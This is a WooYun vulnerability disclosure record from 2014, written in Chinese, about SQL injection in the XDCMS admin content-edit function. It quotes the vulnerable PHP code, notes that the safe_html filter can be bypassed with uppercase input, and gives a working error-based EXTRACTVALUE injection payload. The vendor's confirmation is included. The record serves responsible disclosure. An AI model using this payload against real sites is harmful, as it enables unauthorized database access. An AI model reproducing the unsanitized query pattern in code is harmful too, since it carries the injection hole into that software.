{"id": 58433, "wybug_id": "wooyun-2014-051263", "wybug_title": "XDcms Sql Injection 6-10", "wybug_corp": "www.xdcms.cn", "wybug_author": "HackBraid", "wybug_date": "2014-02-18 12:43", "wybug_open_date": "2014-05-19 12:44", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-19：\t细节向公众公开  简要描述： Sql Injection 详细说明：  注入在XDCMS企业管理系统后台的内容编辑处，\\system\\modules\\xdcms\\content.php文件：这次出在编辑处，用到的函数是edit_save()\npublic function edit_save(){\t\t$title=safe_html($_POST['title']);//第一处注入title字段，safe_html为过滤规则集，可被大写绕过进行注入 \t\t$commend=intval($_POST['commend']);\t\t$username=safe_html($_POST['username']);//第二处注入username，大写可绕过过滤\t\t$thumb=$_POST['thumb'];\t\t$keywords=safe_html($_POST['keywords']);//第三处注入，同上 \t\t$description=safe_html($_POST['description']);//第四处注入，同上\t\t$inputtime=$_POST['inputtime'];\t\t$updatetime=strtotime($_POST['updatetime']);\t\t$url=$_POST['url'];//第五处注入，没有safe_html过滤。\t\t$catid=intval($_POST['catid']);\t\t$id=intval($_POST['id']);\t\t$fields=$_POST['fields'];\t\t$style=$_POST['title_color'].\" \".$_POST['title_weight'];\t\t\t\tif(empty($title)||empty($catid)||empty($inputtime)){\t\t\tshowmsg(C('material_not_complete'),'-1');\t\t}\t\t\t\t$model=modelname($catid);\t\t$model_content=get_content_table($model);\t\tif(empty($model)){\t\t\tshowmsg(C('error'),'-1');\t\t}\t\t\t\t$table=$this->mysql->show_table();   //判断数据表是否存在\t\tif(!in_array(DB_PRE.$model,$table)){\t\t\tshowmsg(C('table_not_exist'),'-1');\t\t}\t\t\t\t\t\t//下面是更新content的sql语句，会将上边5个注入字段带入更新\t\t$sql=\"update \".DB_PRE.$model.\" set title='{$title}',commend='{$commend}',username='{$username}',thumb='{$thumb}',keywords='{$keywords}',description='{$description}',updatetime='{$updatetime}',url='{$url}',style='{$style}' where id='{$id}'\";\t\t$this->mysql->query($sql);\n   漏洞证明：  1.以第一处注入为例，点击编辑：\n\n2.填写exp：\n' AND EXTRACTVALUE(7028,CONCAT(0x5c,0x7177786771,(SELECT (CASE WHEN (7028=7028) THEN 1 ELSE 0 END)),0x71706b6b71)) AND 'PAKz'='PAKz\n\n\n3.得到的注入数据：\n\n   修复方案：  过滤   版权声明：转载请注明来源 HackBraid@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-02-24 22:25 厂商回复： 老版本没有更新 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}